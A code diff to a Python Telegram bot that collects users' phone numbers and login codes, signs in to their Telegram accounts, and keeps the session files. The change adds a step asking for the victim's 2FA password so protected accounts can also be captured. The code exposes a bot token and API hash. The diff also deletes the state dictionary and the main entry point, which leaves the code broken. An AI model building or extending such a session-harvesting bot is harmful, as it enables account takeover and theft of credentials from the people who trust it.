@@ -19,13 +19,6 @@ API_HASH = "72b4ff10bcce5ba17dba09f8aa526a44"  # <-- Replace with your API HASH 
 # Replace with your token
 BOT_TOKEN = "7403077617:AAHpamE_hj-cuNb2kHECiMjD3oSddO_iR20"
 
-# Temporary state storage
-user_states = {}
-
-# Make sure sessions folder exists
-os.makedirs("sessions", exist_ok=True)
-
-# Handle incoming messages
 async def message_handler(update, context):
     user_id = update.message.from_user.id
     text = update.message.text.strip()
@@ -36,7 +29,7 @@ async def message_handler(update, context):
             'phone': text,
             'step': 'waiting_for_otp'
         }
-        
+
         # Create Telethon client for user
         client = TelegramClient(f"sessions/{user_id}", API_ID, API_HASH)
         await client.connect()
@@ -58,16 +51,14 @@ async def message_handler(update, context):
 
         try:
             await client.sign_in(phone=phone, code=otp)
-
-            # Save session automatically when logged in
             await client.disconnect()
-            
             await update.message.reply_text("✅ Session created successfully!")
             print(f"[+] Session created for {phone}")
 
         except SessionPasswordNeededError:
-            await update.message.reply_text("🔒 Your account has 2FA password enabled. Cannot proceed.")
-            await client.disconnect()
+            # 2FA enabled, request password
+            user_states[user_id]['step'] = 'waiting_for_2fa_password'
+            await update.message.reply_text("🔒 2FA is enabled on this account. Please enter your 2FA password:")
 
         except Exception as e:
             await update.message.reply_text(f"❌ Error logging in: {e}")
@@ -77,13 +68,23 @@ async def message_handler(update, context):
         if user_id in user_states:
             del user_states[user_id]
 
-# Main function
-def main():
-    app = ApplicationBuilder().token(BOT_TOKEN).build()
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
+    elif user_states[user_id]['step'] == 'waiting_for_2fa_password':
+        # Handle 2FA password input
+        client = user_states[user_id]['client']
+        phone = user_states[user_id]['phone']
+        password = text
 
-    print("🤖 Bot is running...")
-    app.run_polling()
+        try:
+            await client.sign_in(password=password)
+            # Save session or perform any other task needed after 2FA
+            await client.disconnect()
+            await update.message.reply_text("✅ 2FA password verified. Session created successfully!")
+            print(f"[+] 2FA password verified for {phone}")
 
-if __name__ == "__main__":
-    main()
+        except Exception as e:
+            await update.message.reply_text(f"❌ Error with 2FA password: {e}")
+            await client.disconnect()
+
+        # Cleanup user state
+        if user_id in user_states:
+            del user_states[user_id]
